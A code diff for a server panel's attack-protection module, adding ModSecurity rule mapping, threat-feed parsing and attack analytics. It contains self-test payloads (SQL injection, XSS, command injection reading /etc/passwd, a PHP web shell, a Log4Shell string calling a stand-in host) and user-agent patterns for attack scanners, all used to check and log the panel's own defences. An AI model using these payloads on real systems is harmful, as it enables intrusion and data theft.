@@ -23,9 +23,20 @@ from .nginx import challenge_ready, site_modes
 
 log = logging.getLogger("nm.protection")
 
-KINDS = {"waf": "Фильтр запросов", "custom": "Свои правила", "threat": "Списки угроз", "hotlink": "Хотлинкинг",
+KINDS = {"waf": "Фильтр запросов", "modsec": "Глубокая проверка (ModSecurity)", "custom": "Свои правила",
+         "threat": "Списки угроз", "fakebot": "Поддельные роботы", "hotlink": "Хотлинкинг",
          "challenge": "Проверка браузера", "honeypot": "Ловушки", "ratelimit": "Ограничение частоты",
          "sni": "Host и SNI не совпадают"}
+# Группы правил OWASP CRS (первые три цифры номера) → категории фильтра запросов панели
+CRS_GROUPS = {"911": ("protocol", "Недопустимый метод"), "913": ("scanners", "Сканеры"),
+              "920": ("protocol", "Нарушение протокола HTTP"), "921": ("protocol", "Атака на протокол (контрабанда, CRLF)"),
+              "922": ("protocol", "Атака через multipart"), "930": ("traversal", "Включение локальных файлов (LFI)"),
+              "931": ("rfi", "Удалённое включение файлов (RFI)"), "932": ("rce", "Внедрение команд (RCE)"),
+              "933": ("php", "Атака на PHP"), "934": ("rce", "Атака на Node.js и другие"),
+              "941": ("xss", "Межсайтовый скриптинг (XSS)"), "942": ("sqli", "SQL-инъекция"),
+              "943": ("session", "Фиксация сессии"), "944": ("java", "Атака на Java"),
+              "200": ("protocol", "Ошибка разбора тела запроса")}
+CRS_SKIP = {"949110", "959100", "980130", "980140", "980145", "980170", "949111", "959101"}
 ACTIONS = {"blocked": "заблокировано", "detected": "записано", "challenged": "проверка браузера",
            "passed": "проверка пройдена", "banned": "IP заблокирован", "allowed": "пропущено"}
 MAX_FEED_BYTES = 40 * 1024 * 1024
@@ -35,9 +46,35 @@ MAX_FEED_ENTRIES = 1_500_000
 # =============================================================================
 #  Списки угроз
 # =============================================================================
+def _json_nets(obj: Any) -> List[str]:
+    """Все строки-подсети в JSON (формат Google/Bing/OpenAI: {"prefixes": [{"ipv4Prefix": …}]})."""
+    out: List[str] = []
+    stack = [obj]
+    while stack:
+        o = stack.pop()
+        if isinstance(o, dict):
+            stack.extend(o.values())
+        elif isinstance(o, list):
+            stack.extend(o)
+        elif isinstance(o, str) and ("." in o or ":" in o) and len(o) < 50 and not any(c in o for c in "TZ- "):
+            try:  # «66.249.64.0/27», «2001:4860::/64» и одиночные адреса (DuckDuckGo, Amazon)
+                ipaddress.ip_network(o, strict=False)
+            except ValueError:
+                continue
+            out.append(o)
+    return out
+
+
 def parse_feed(text: str) -> Tuple[List[str], int]:
-    """Текст списка → нормализованные адреса и подсети (первое слово строки; комментарии # и ;)."""
+    """Текст списка → нормализованные адреса и подсети (первое слово строки; комментарии # и ;). JSON-файлы
+    (диапазоны роботов) — все строки вида «адрес/маска»."""
     out, bad, seen = [], 0, set()
+    st = text.lstrip()
+    if st[:1] in "{[":
+        try:
+            text = "\n".join(_json_nets(json.loads(st)))
+        except ValueError:
+            pass
     for line in text.splitlines():
         line = line.split("#", 1)[0].split(";", 1)[0].strip()
         if not line:
@@ -69,6 +106,18 @@ def parse_feed(text: str) -> Tuple[List[str], int]:
     return out, bad
 
 
+def feed_error(e: Exception) -> str:
+    """Ошибка загрузки списка — коротко и по-русски."""
+    import urllib.error
+    if isinstance(e, urllib.error.HTTPError):
+        return f"сервер ответил {e.code} {e.reason}"
+    if isinstance(e, urllib.error.URLError):
+        return f"нет связи с сервером списка: {e.reason}"
+    if isinstance(e, (socket.timeout, TimeoutError)):
+        return "сервер списка не ответил вовремя"
+    return str(e)[:300]
+
+
 def fetch_feed(url: str, timeout: int = 60) -> str:
     if url.startswith("file://"):
         return Path(url[7:]).read_text(encoding="utf-8", errors="replace")
@@ -83,8 +132,19 @@ def fetch_feed(url: str, timeout: int = 60) -> str:
 # =============================================================================
 #  Самопроверка: «сырые» HTTP-запросы к nginx на этом сервере
 # =============================================================================
+# Атаки в теле запроса — их видит только глубокая проверка (ModSecurity + OWASP CRS)
+MODSEC_CASES = [
+    ("SQL-инъекция в форме", "application/x-www-form-urlencoded", "login=admin&q=1' UNION SELECT password FROM users--"),
+    ("XSS в JSON", "application/json", '{"comment": "<script>alert(document.cookie)</script>"}'),
+    ("Внедрение команд в форме", "application/x-www-form-urlencoded", "host=127.0.0.1;cat /etc/passwd"),
+    ("Обход каталогов в форме", "application/x-www-form-urlencoded", "file=../../../../etc/shadow"),
+    ("Внедрение PHP в форме", "application/x-www-form-urlencoded", "x=<?php system($_GET['c']); ?>"),
+    ("Log4Shell в JSON", "application/json", '{"user": "${jndi:ldap://evil.example/a}"}'),
+]
+
+
 def raw_request(host: str, port: int, tls: bool, sni: str, method: str, target: str, headers: Dict[str, str],
-                timeout: float = 5.0) -> Tuple[Optional[int], Dict[str, str]]:
+                timeout: float = 5.0, body: bytes = b"") -> Tuple[Optional[int], Dict[str, str]]:
     """Отправить запрос как есть (без нормализации URL) и прочитать статус. None — соединение закрыто (444)."""
     s = socket.create_connection((host, port), timeout=timeout)
     try:
@@ -95,7 +155,9 @@ def raw_request(host: str, port: int, tls: bool, sni: str, method: str, target: 
             s = ctx.wrap_socket(s, server_hostname=sni)
         lines = [f"{method} {target} HTTP/1.1", f"Host: {sni}", "Connection: close"]
         lines += [f"{k}: {v}" for k, v in headers.items()]
-        s.sendall(("\r\n".join(lines) + "\r\n\r\n").encode("utf-8", "surrogateescape"))
+        if body:
+            lines.append(f"Content-Length: {len(body)}")
+        s.sendall(("\r\n".join(lines) + "\r\n\r\n").encode("utf-8", "surrogateescape") + body)
         buf = b""
         while b"\r\n\r\n" not in buf and len(buf) < 65536:
             chunk = s.recv(4096)
@@ -206,6 +268,451 @@ def sysctl_report() -> List[Dict[str, Any]]:
 
 
 # =============================================================================
+#  Аналитика защиты
+# =============================================================================
+# Инструменты атакующих по User-Agent: (ключ, название, регулярное выражение)
+TOOLS = [
+    ("sqlmap", "sqlmap", r"sqlmap"), ("nuclei", "Nuclei", r"nuclei"), ("nikto", "Nikto", r"nikto"),
+    ("wpscan", "WPScan", r"wpscan"), ("zgrab", "ZGrab", r"zgrab"), ("masscan", "masscan", r"masscan"),
+    ("nmap", "Nmap", r"nmap"), ("acunetix", "Acunetix", r"acunetix|wvs"), ("burp", "Burp Suite", r"burp"),
+    ("zap", "OWASP ZAP", r"\bzap\b|owasp"), ("dirbust", "Перебор путей (gobuster, ffuf, dirsearch…)",
+                                             r"gobuster|dirbuster|ffuf|feroxbuster|dirsearch|wfuzz"),
+    ("censys", "Censys, Shodan и другие сканеры интернета", r"censys|shodan|internet-measurement|expanse|"
+                                                            r"zoomeye|netcraft|leakix|onyphe|binaryedge"),
+    ("headless", "Headless-браузер", r"headless|phantomjs|puppeteer|playwright|selenium"),
+    ("python", "Python (requests, urllib, aiohttp, httpx)", r"python|aiohttp|httpx|scrapy"),
+    ("go", "Go-http-client", r"go-http-client|\bgo/"), ("curl", "curl, wget", r"\bcurl|wget"),
+    ("java", "Java, Apache HttpClient, okhttp", r"java/|apache-httpclient|okhttp"),
+    ("node", "Node.js (axios, node-fetch)", r"axios|node-fetch|node\.js|undici"),
+    ("perl", "Perl, PHP, Ruby", r"libwww-perl|lwp::|php/|guzzle|ruby"),
+    ("bot", "Боты и сборщики (bot, crawler, spider)", r"bot\b|bot/|crawler|spider|scraper"),
+    ("browser", "Похоже на браузер", r"mozilla/5\.0"),
+]
+_TOOLS_RE = [(k, t, re.compile(rx, re.I)) for k, t, rx in TOOLS]
+
+
+def classify_ua(ua: str) -> str:
+    if not ua or ua == "-":
+        return "empty"
+    for k, _t, rx in _TOOLS_RE:
+        if rx.search(ua):
+            return k
+    return "other"
+
+
+ATTACK_TOOLS = {"sqlmap", "nuclei", "nikto", "wpscan", "zgrab", "masscan", "nmap", "acunetix", "burp", "zap", "dirbust"}
+TOOL_TITLES = {k: t for k, t, _ in TOOLS} | {"empty": "Пустой User-Agent", "other": "Прочие"}
+
+
+def pick_tool(c: Counter) -> str:
+    """Главный инструмент по счётчику инструментов адреса: сканер атак важнее скрипта, скрипт — бота и браузера."""
+    if not c:
+        return "other"
+    for group in (ATTACK_TOOLS, None):
+        cand = [(n, k) for k, n in c.items() if (k in group if group else k not in ("browser", "bot", "other"))]
+        if cand:
+            return max(cand)[1]
+    return c.most_common(1)[0][0]
+
+
+def rule_category(kind: str, rule: str) -> str:
+    """Категория атаки для аналитики: категория фильтра запросов, группа CRS или сам механизм."""
+    if kind == "waf" and "/" in rule:
+        return rule.split("/", 1)[0]
+    if kind == "modsec":
+        return CRS_GROUPS.get(rule.split("/", 1)[-1][:3], ("other", ""))[0]
+    return kind
+
+
+def bucket_step(hours: int) -> int:
+    return 300 if hours <= 6 else 1800 if hours <= 48 else 3 * 3600 if hours <= 24 * 8 else 6 * 3600
+
+
+class ProtectionAnalytics:
+    """Отчёты раздела «Защита от атак» по attack_minute (точные счётчики), attack_log (подробные записи,
+    во время флуда — выборка) и prot_minute (проверка браузера, роботы)."""
+
+    def __init__(self, svc: "ProtectionService") -> None:
+        self.svc = svc
+        self.db = svc.db
+
+    def _cond(self, since: float, until: Optional[float] = None, site: str = "", col: str = "ts"):
+        cond, args = [f"{col}>=?"], [since]
+        if until is not None:
+            cond.append(f"{col}<?")
+            args.append(until)
+        if site:
+            cond.append("site=?")
+            args.append(site)
+        return " AND ".join(cond), args
+
+    def site_names(self) -> Dict[str, str]:
+        return {str(r["id"]): r["name"] for r in self.db.query("SELECT id, name FROM sites")}
+
+    def analytics(self, hours: int = 24, site: str = "") -> Dict[str, Any]:
+        now = time.time()
+        since, prev = now - hours * 3600, now - 2 * hours * 3600
+        step = bucket_step(hours)
+        cond, args = self._cond(since, site=site)
+        pcond, pargs = self._cond(prev, since, site=site)
+        acts = ("blocked", "detected", "challenged", "banned")
+        tot = {r["action"]: r["n"] for r in self.db.query(
+            f"SELECT action, SUM(n) AS n FROM attack_minute WHERE {cond} GROUP BY action", args)}
+        ptot = {r["action"]: r["n"] for r in self.db.query(
+            f"SELECT action, SUM(n) AS n FROM attack_minute WHERE {pcond} GROUP BY action", pargs)}
+        kinds = {r["kind"]: r["n"] for r in self.db.query(
+            f"SELECT kind, SUM(n) AS n FROM attack_minute WHERE {cond} GROUP BY kind", args)}
+        pkinds = {r["kind"]: r["n"] for r in self.db.query(
+            f"SELECT kind, SUM(n) AS n FROM attack_minute WHERE {pcond} GROUP BY kind", pargs)}
+        rows = self.db.query(f"SELECT (ts/{step})*{step} AS b, kind, rule, action, site, SUM(n) AS n FROM attack_minute "
+                             f"WHERE {cond} GROUP BY b, kind, rule, action, site", args)
+        by = {"kind": Counter(), "action": Counter(), "cat": Counter(), "site": Counter()}
+        cats, rule_tot, rule_series = Counter(), Counter(), {}
+        peak = Counter()
+        for r in rows:
+            b, n = r["b"], r["n"]
+            cat = rule_category(r["kind"], r["rule"])
+            by["action"][(b, r["action"])] += n
+            if r["action"] in acts:
+                by["kind"][(b, r["kind"])] += n
+                by["cat"][(b, cat)] += n
+                by["site"][(b, r["site"])] += n
+                cats[cat] += n
+                peak[b] += n
+            key = (r["kind"], r["rule"])
+            rule_tot[key] += n
+            rule_series.setdefault(key, Counter())[b] += n
+        series = {k: [{"b": b, "key": key, "n": n} for (b, key), n in sorted(c.items())] for k, c in by.items()}
+        tcond, targs = self._cond(since, site=site or "*")
+        traffic = {r["b"]: r["n"] for r in self.db.query(
+            f"SELECT (ts/{step})*{step} AS b, SUM(req) AS n FROM stats_minute WHERE {tcond} GROUP BY b", targs)}
+        total_req = sum(traffic.values())
+        lcond, largs = self._cond(since, site=site)
+        lcond += " AND test=0"
+        uniq = self.db.query(f"SELECT (CAST(ts AS INTEGER)/{step})*{step} AS b, COUNT(DISTINCT ip) AS n FROM attack_log "
+                             f"WHERE {lcond} GROUP BY b ORDER BY b", largs)
+        uniq_total = (self.db.one(f"SELECT COUNT(DISTINCT ip) AS n FROM attack_log WHERE {lcond}", largs) or {}).get("n", 0)
+        pl, pla = self._cond(prev, since, site=site)
+        uniq_prev = (self.db.one(f"SELECT COUNT(DISTINCT ip) AS n FROM attack_log WHERE {pl} AND test=0", pla)
+                     or {}).get("n", 0)
+        # тепловая карта: день недели × час (не меньше недели истории)
+        hcond, hargs = self._cond(now - max(hours, 168) * 3600, site=site)
+        heat = [[0] * 24 for _ in range(7)]
+        for r in self.db.query(f"SELECT (ts/3600)*3600 AS h, SUM(n) AS n FROM attack_minute WHERE {hcond} AND action IN "
+                               "('blocked','detected','challenged','banned') GROUP BY h", hargs):
+            lt = time.localtime(r["h"])
+            heat[lt.tm_wday][lt.tm_hour] += r["n"]
+        tools = Counter()
+        for r in self.db.query(f"SELECT ua, COUNT(*) AS n FROM attack_log WHERE {lcond} GROUP BY ua "
+                               "ORDER BY n DESC LIMIT 2000", largs):
+            tools[classify_ua(r["ua"])] += r["n"]
+        methods = self.db.query(f"SELECT method AS key, COUNT(*) AS n FROM attack_log WHERE {lcond} GROUP BY method "
+                                "ORDER BY n DESC LIMIT 10", largs)
+        statuses = self.db.query(f"SELECT status AS key, COUNT(*) AS n FROM attack_log WHERE {lcond} GROUP BY status "
+                                 "ORDER BY n DESC LIMIT 12", largs)
+        paths = self.db.query(
+            f"SELECT CASE WHEN instr(uri,'?')>0 THEN substr(uri,1,instr(uri,'?')-1) ELSE uri END AS key, "
+            f"COUNT(*) AS n, COUNT(DISTINCT ip) AS ips FROM attack_log WHERE {lcond} GROUP BY key ORDER BY n DESC "
+            "LIMIT 20", largs)
+        hosts = self.db.query(f"SELECT host AS key, COUNT(*) AS n FROM attack_log WHERE {lcond} AND host!='' "
+                              "GROUP BY host ORDER BY n DESC LIMIT 10", largs)
+        countries = self.db.query(f"SELECT country AS key, COUNT(*) AS n, COUNT(DISTINCT ip) AS ips FROM attack_log "
+                                  f"WHERE {lcond} AND country!='' GROUP BY country ORDER BY n DESC LIMIT 20", largs)
+        rule_ips = {r["rule"]: r["n"] for r in self.db.query(
+            f"SELECT rule, COUNT(DISTINCT ip) AS n FROM attack_log WHERE {lcond} GROUP BY rule", largs)}
+        rule_meta = {(r["kind"], r["rule"]): r for r in self.db.query(
+            f"SELECT kind, rule, MIN(ts) AS first, MAX(ts) AS last, COUNT(DISTINCT site) AS sites, "
+            f"SUM(CASE WHEN action='blocked' THEN n ELSE 0 END) AS blocked, "
+            f"SUM(CASE WHEN action='detected' THEN n ELSE 0 END) AS detected FROM attack_minute WHERE {cond} "
+            "GROUP BY kind, rule", args)}
+        top_rules = []
+        for (kind, rule), n in rule_tot.most_common(40):
+            m = rule_meta.get((kind, rule), {})
+            top_rules.append({"kind": kind, "rule": rule, "title": self.svc.rule_title(kind, rule), "n": n,
+                              "cat": rule_category(kind, rule), "ips": rule_ips.get(rule, 0),
+                              "sites": m.get("sites", 0), "first": m.get("first"), "last": m.get("last"),
+                              "blocked": m.get("blocked", 0), "detected": m.get("detected", 0),
+                              "spark": [rule_series[(kind, rule)].get(b, 0) for b in
+                                        range(int(since // step) * step, int(now) + 1, step)]})
+        feeds = Counter()
+        for (kind, rule), n in rule_tot.items():
+            if kind == "threat":
+                feeds[rule.split("/", 1)[-1].split(":")[0]] += n
+        feed_names = {f.id: f.name for f in self.svc.settings().threat_feeds}
+        rl = Counter({rule.split("/", 1)[-1]: n for (kind, rule), n in rule_tot.items() if kind == "ratelimit"})
+        pcd, pca = self._cond(since, site=site)
+        ch = {r["key"]: {"n": r["n"], "ms": r["ms"]} for r in self.db.query(
+            f"SELECT key, SUM(n) AS n, SUM(ms) AS ms FROM prot_minute WHERE {pcd} AND metric='challenge' GROUP BY key",
+            pca)}
+        solve = {r["key"]: r["n"] for r in self.db.query(
+            f"SELECT key, SUM(n) AS n FROM prot_minute WHERE {pcd} AND metric='solve' GROUP BY key", pca)}
+        ch_series = self.db.query(f"SELECT (ts/{step})*{step} AS b, key, SUM(n) AS n FROM prot_minute WHERE {pcd} "
+                                  "AND metric='challenge' GROUP BY b, key ORDER BY b", pca)
+        bots = Counter()
+        for r in self.db.query(f"SELECT key, SUM(n) AS n FROM prot_minute WHERE {pcd} AND metric='bot' GROUP BY key",
+                               pca):
+            bots[r["key"]] += r["n"]
+        bot_names = {b.id: b.name for b in self.svc.settings().verified_bots}
+        bot_rows = []
+        for bid in sorted({k.split(":")[0] for k in bots}):
+            bot_rows.append({"id": bid, "name": bot_names.get(bid, bid), "ok": bots.get(f"{bid}:ok", 0),
+                             "fake": bots.get(f"{bid}:fake", 0)})
+        periods = self.db.query("SELECT * FROM attack_periods WHERE start>=? OR end IS NULL OR end>=? "
+                                "ORDER BY start DESC LIMIT 50", (since, since))
+        names = self.site_names()
+        for r in periods:
+            r["name"] = "все сайты" if r["site"] == "*" else names.get(r["site"], r["site"])
+            r["duration"] = (r["end"] or now) - r["start"]
+        pk = max(peak.items(), key=lambda x: x[1]) if peak else (None, 0)
+        sites = Counter()
+        for (b, sid), n in by["site"].items():
+            sites[sid] += n
+        return {
+            "hours": hours, "since": since, "step": step, "now": now,
+            "totals": tot, "prev_totals": ptot, "kinds": kinds, "prev_kinds": pkinds,
+            "attacks": sum(tot.get(a, 0) for a in acts), "prev_attacks": sum(ptot.get(a, 0) for a in acts),
+            "unique_ips": uniq_total, "prev_unique_ips": uniq_prev,
+            "series": series, "traffic": [{"b": b, "n": n} for b, n in sorted(traffic.items())],
+            "total_requests": total_req, "uniq_series": uniq,
+            "peak": {"b": pk[0], "n": pk[1], "per_min": round(pk[1] / (step / 60), 1)},
+            "heat": heat, "categories": [{"key": k, "n": n} for k, n in cats.most_common()],
+            "tools": [{"key": k, "title": TOOL_TITLES.get(k, k), "n": n} for k, n in tools.most_common()],
+            "methods": methods, "statuses": statuses, "paths": paths, "hosts": hosts, "countries": countries,
+            "rules": top_rules,
+            "feeds": [{"id": k, "name": feed_names.get(k, k), "n": n} for k, n in feeds.most_common()],
+            "ratelimit": [{"id": k, "title": self.svc.rule_title("ratelimit", "ratelimit/" + k), "n": n}
+                          for k, n in rl.most_common()],
+            "challenge": ch, "solve": solve, "challenge_series": ch_series, "bots": bot_rows,
+            "periods": periods,
+            "sites": [{"site": k, "name": names.get(k, k or "—"), "n": n} for k, n in sites.most_common(20)],
+            "kinds_titles": KINDS, "cat_titles": {**{k: v["title"] for k, v in W.CATEGORIES.items()},
+                                                  **{k: v for k, v in KINDS.items()},
+                                                  "session": "Фиксация сессии", "other": "Прочее"},
+        }
+
+    def attackers(self, hours: int = 24, site: str = "", q: str = "", limit: int = 200) -> List[Dict[str, Any]]:
+        since = time.time() - hours * 3600
+        cond, args = self._cond(since, site=site)
+        cond += " AND test=0 AND ip!=''"
+        if q:
+            cond += " AND (ip LIKE ? OR country=? OR ua LIKE ?)"
+            args += [f"%{q}%", q.upper(), f"%{q}%"]
+        rows = self.db.query(
+            f"SELECT ip, MAX(country) AS country, COUNT(*) AS n, MIN(ts) AS first, MAX(ts) AS last, "
+            f"COUNT(DISTINCT rule) AS rules, COUNT(DISTINCT site) AS sites, GROUP_CONCAT(DISTINCT kind) AS kinds, "
+            f"SUM(CASE WHEN action='blocked' THEN 1 ELSE 0 END) AS blocked, "
+            f"SUM(CASE WHEN action='detected' THEN 1 ELSE 0 END) AS detected, "
+            f"SUM(CASE WHEN action='challenged' THEN 1 ELSE 0 END) AS challenged, MAX(ua) AS ua "
+            f"FROM attack_log WHERE {cond} GROUP BY ip ORDER BY n DESC LIMIT ?", args + [min(limit, 1000)])
+        banned = self._banned()
+        # инструмент адреса: самый «опасный» из его User-Agent (сканер атак → скрипт → бот → браузер)
+        uas: Dict[str, Counter] = {}
+        ips = [r["ip"] for r in rows]
+        for i in range(0, len(ips), 500):
+            part = ips[i:i + 500]
+            for u in self.db.query(f"SELECT ip, ua, COUNT(*) AS n FROM attack_log WHERE {cond} AND ip IN "
+                                   f"({','.join('?' * len(part))}) GROUP BY ip, ua", args + part):
+                uas.setdefault(u["ip"], Counter())[classify_ua(u["ua"] or "")] += u["n"]
+        for r in rows:
+            r["tool"] = pick_tool(uas.get(r["ip"], Counter()))
+            r["tool_title"] = TOOL_TITLES.get(r["tool"], r["tool"])
+            r["tools"] = [TOOL_TITLES.get(k, k) for k, _ in uas.get(r["ip"], Counter()).most_common(4)]
+            r["banned"] = r["ip"] in banned
+            r["score"] = self.score_ip(r)
+        return rows
+
+    @staticmethod
+    def score_ip(r: Dict[str, Any]) -> int:
+        """Оценка угрозы 0–100: объём, разнообразие правил (сканирование), разные сайты, инструменты атаки."""
+        import math
+        sc = min(35, round(12 * math.log2((r.get("n") or 0) + 1))) + min(20, (r.get("rules") or 0) * 5) + \
+            min(10, max(0, (r.get("sites") or 1) - 1) * 5)
+        tool = r.get("tool")
+        if tool in ATTACK_TOOLS:
+            sc += 30
+        elif tool not in ("browser", "other", "bot"):
+            sc += 15
+        if "honeypot" in (r.get("kinds") or ""):
+            sc += 15
+        return min(100, sc)
+
+    def _banned(self) -> set:
+        try:
+            return {r["net"] for r in self.db.query("SELECT net FROM bans WHERE expires_at IS NULL OR expires_at>?",
+                                                    (time.time(),))}
+        except Exception:  # noqa: BLE001
+            return set()
+
+    def ip_profile(self, ip: str, hours: int = 168) -> Dict[str, Any]:
+        now = time.time()
+        since = now - hours * 3600
+        step = bucket_step(hours)
+        args = [ip, since]
+        base = "ip=? AND ts>=? AND test=0"
+        summ = self.db.one(f"SELECT COUNT(*) AS n, MIN(ts) AS first, MAX(ts) AS last, MAX(country) AS country, "
+                           f"COUNT(DISTINCT site) AS sites, COUNT(DISTINCT rule) AS rules FROM attack_log WHERE {base}",
+                           args) or {}
+        ever = self.db.one("SELECT MIN(ts) AS first, COUNT(*) AS n FROM attack_log WHERE ip=? AND test=0", (ip,)) or {}
+        series = self.db.query(f"SELECT (CAST(ts AS INTEGER)/{step})*{step} AS b, action, COUNT(*) AS n FROM attack_log "
+                               f"WHERE {base} GROUP BY b, action ORDER BY b", args)
+        rules = self.db.query(f"SELECT kind, rule, COUNT(*) AS n, MAX(ts) AS last FROM attack_log WHERE {base} "
+                              "GROUP BY kind, rule ORDER BY n DESC LIMIT 30", args)
+        for r in rules:
+            r["title"] = self.svc.rule_title(r["kind"], r["rule"])
+        names = self.site_names()
+        sites = self.db.query(f"SELECT site, COUNT(*) AS n FROM attack_log WHERE {base} GROUP BY site ORDER BY n DESC",
+                              args)
+        for r in sites:
+            r["name"] = names.get(r["site"], r["site"] or "—")
+        uas = self.db.query(f"SELECT ua, COUNT(*) AS n FROM attack_log WHERE {base} GROUP BY ua ORDER BY n DESC "
+                            "LIMIT 10", args)
+        for r in uas:
+            r["tool"] = TOOL_TITLES.get(classify_ua(r["ua"]), "")
+        paths = self.db.query(f"SELECT uri, method, status, COUNT(*) AS n FROM attack_log WHERE {base} "
+                              "GROUP BY uri, method ORDER BY n DESC LIMIT 25", args)
+        events = self.svc.events(limit=50, ip=ip)
+        traffic = None
+        try:
+            t = self.db.one("SELECT COUNT(*) AS n, SUM(CASE WHEN status>=400 THEN 1 ELSE 0 END) AS err FROM requests "
+                            "WHERE ip=? AND ts>=?", (ip, since))
+            traffic = dict(t) if t else None
+        except Exception:  # noqa: BLE001 — журнал запросов может быть выключен
+            traffic = None
+        ban = None
+        try:
+            ban = self.db.one("SELECT * FROM bans WHERE net=? AND (expires_at IS NULL OR expires_at>?)", (ip, now))
+        except Exception:  # noqa: BLE001
+            ban = None
+        p = self.svc.settings()
+        trusted = any(_in_net(ip, n) for n in p.bypass_ips)
+        feeds = self.svc.ip_in_feeds(ip)
+        r = {"ip": ip, "hours": hours, "step": step, "since": since, "summary": summ, "ever": ever, "series": series,
+             "rules": rules, "sites": sites, "uas": uas, "paths": paths, "events": events, "traffic": traffic,
+             "ban": ban, "trusted": trusted, "feeds": feeds}
+        r["score"] = self.score_ip({"n": summ.get("n", 0), "rules": summ.get("rules", 0), "sites": summ.get("sites", 0),
+                                    "tool": pick_tool(sum((Counter({classify_ua(u["ua"]): u["n"]}) for u in uas),
+                                                          Counter())),
+                                    "kinds": ",".join(x["kind"] for x in rules)})
+        return r
+
+    def insights(self, now: Optional[float] = None) -> List[tuple]:
+        """Находки для встроенного анализа: (сценарий, уровень, сайт, сводка, данные, значение, ключ)."""
+        now = now or time.time()
+        out: List[tuple] = []
+        p = self.svc.settings()
+        blocked = ('blocked','detected','challenged','banned')
+        acts = ",".join(f"'{a}'" for a in blocked)
+        names = self.site_names()
+        # всплеск атак: последние 15 минут против среднего за сутки
+        cur = {r["site"]: r["n"] for r in self.db.query(
+            f"SELECT site, SUM(n) AS n FROM attack_minute WHERE ts>=? AND action IN ({acts}) GROUP BY site",
+            (now - 900,))}
+        day = {r["site"]: r["n"] for r in self.db.query(
+            f"SELECT site, SUM(n) AS n FROM attack_minute WHERE ts>=? AND ts<? AND action IN ({acts}) GROUP BY site",
+            (now - 86400, now - 900))}
+        for sid, n in cur.items():
+            base = (day.get(sid, 0) / 95) or 0.0
+            if n >= 100 and n >= 5 * base:
+                top = self.db.query("SELECT kind, rule, SUM(n) AS n FROM attack_minute WHERE ts>=? AND site=? "
+                                    "GROUP BY kind, rule ORDER BY n DESC LIMIT 5", (now - 900, sid))
+                out.append(("attack_surge", "crit" if n >= 1000 else "warn", sid or "*",
+                            f"{n} атак за 15 минут (обычно ~{base:.0f})",
+                            {"columns": ["Правило", "Срабатываний"],
+                             "rows": [[self.svc.rule_title(r["kind"], r["rule"]), r["n"]] for r in top]}, n, ""))
+        # фильтр в режиме обучения
+        det = {r["site"]: r["n"] for r in self.db.query(
+            "SELECT site, SUM(n) AS n FROM attack_minute WHERE ts>=? AND kind='waf' AND action='detected' GROUP BY site",
+            (now - 86400,))}
+        for sid, sp in self.svc.site_prot().items():
+            if sp.enabled and sp.waf == "detect" and det.get(sid, 0) >= 50:
+                out.append(("waf_learning", "warn", sid, f"за сутки записано {det[sid]} атак — они не блокируются",
+                            None, det[sid], ""))
+        # время прохождения проверки браузера
+        ch = self.db.one("SELECT SUM(n) AS n, SUM(ms) AS ms FROM prot_minute WHERE ts>=? AND metric='challenge' "
+                         "AND key='solved'", (now - 3600,)) or {}
+        if (ch.get("n") or 0) >= 20 and ch["ms"] / ch["n"] >= 6000:
+            out.append(("challenge_slow", "warn", "*", f"в среднем {ch['ms'] / ch['n'] / 1000:.1f} с при сложности "
+                                                       f"{p.challenge_difficulty} бит", None,
+                        round(ch["ms"] / ch["n"] / 1000, 1), ""))
+        # поддельные роботы, которые только записываются
+        if p.fake_bot_action == "detect":
+            fb = self.db.one("SELECT SUM(n) AS n FROM attack_minute WHERE ts>=? AND kind='fakebot'", (now - 3600,)) or {}
+            if (fb.get("n") or 0) >= 20:
+                out.append(("fake_bots", "warn", "*", f"{fb['n']} запросов за час", None, fb["n"], ""))
+        # активный атакующий без блокировки
+        banned = self._banned()
+        for r in self.db.query("SELECT ip, MAX(country) AS country, COUNT(*) AS n, COUNT(DISTINCT rule) AS rules "
+                               "FROM attack_log WHERE ts>=? AND test=0 AND ip!='' AND action IN ('blocked','detected') "
+                               "GROUP BY ip HAVING n>=50 ORDER BY n DESC LIMIT 3", (now - 3600,)):
+            if r["ip"] not in banned and not any(_in_net(r["ip"], b) for b in banned if "/" in b):
+                out.append(("attacker_active", "warn", "*",
+                            f"{r['ip']}{' (' + r['country'] + ')' if r['country'] else ''}: {r['n']} срабатываний, "
+                            f"правил: {r['rules']}", None, r["n"], r["ip"]))
+        # правило частоты задевает много адресов
+        for r in self.db.query("SELECT rule, COUNT(DISTINCT ip) AS ips, COUNT(*) AS n FROM attack_log WHERE ts>=? "
+                               "AND kind='ratelimit' AND test=0 GROUP BY rule HAVING ips>=20", (now - 3600,)):
+            out.append(("rate_rule_users", "info", "*", f"{self.svc.rule_title('ratelimit', r['rule'])}: "
+                                                        f"{r['ips']} адресов, {r['n']} отказов за час",
+                        None, r["ips"], r["rule"]))
+        # «Под атакой» вручную больше суток
+        st = self.svc.attack_state()
+        for key, v in [("*", st.get("global"))] + list((st.get("sites") or {}).items()):
+            if v and not v.get("auto") and now - (v.get("since") or now) > 86400 and \
+                    (v.get("until") is None or v["until"] > now):
+                out.append(("attack_mode_long", "info", key if key != "*" else "*",
+                            f"{'все сайты' if key == '*' else names.get(key, key)}: "
+                            f"{(now - v['since']) / 3600:.0f} ч", None, None, key))
+        return out
+
+    def rule_detail(self, kind: str, rule: str, hours: int = 168, site: str = "") -> Dict[str, Any]:
+        now = time.time()
+        since = now - hours * 3600
+        step = bucket_step(hours)
+        cond, args = self._cond(since, site=site)
+        cond += " AND kind=? AND rule=?"
+        args += [kind, rule]
+        series = self.db.query(f"SELECT (ts/{step})*{step} AS b, action, SUM(n) AS n FROM attack_minute WHERE {cond} "
+                               "GROUP BY b, action ORDER BY b", args)
+        tot = {r["action"]: r["n"] for r in self.db.query(
+            f"SELECT action, SUM(n) AS n FROM attack_minute WHERE {cond} GROUP BY action", args)}
+        names = self.site_names()
+        sites = self.db.query(f"SELECT site, SUM(n) AS n FROM attack_minute WHERE {cond} GROUP BY site ORDER BY n DESC",
+                              args)
+        for r in sites:
+            r["name"] = names.get(r["site"], r["site"] or "—")
+        lc = cond + " AND test=0"
+        ips = self.db.query(f"SELECT ip, MAX(country) AS country, COUNT(*) AS n, MAX(ts) AS last FROM attack_log "
+                            f"WHERE {lc} GROUP BY ip ORDER BY n DESC LIMIT 20", args)
+        paths = self.db.query(f"SELECT uri, COUNT(*) AS n FROM attack_log WHERE {lc} GROUP BY uri ORDER BY n DESC "
+                              "LIMIT 15", args)
+        uas = self.db.query(f"SELECT ua, COUNT(*) AS n FROM attack_log WHERE {lc} GROUP BY ua ORDER BY n DESC LIMIT 10",
+                            args)
+        meta: Dict[str, Any] = {"title": self.svc.rule_title(kind, rule), "kind": kind, "rule": rule,
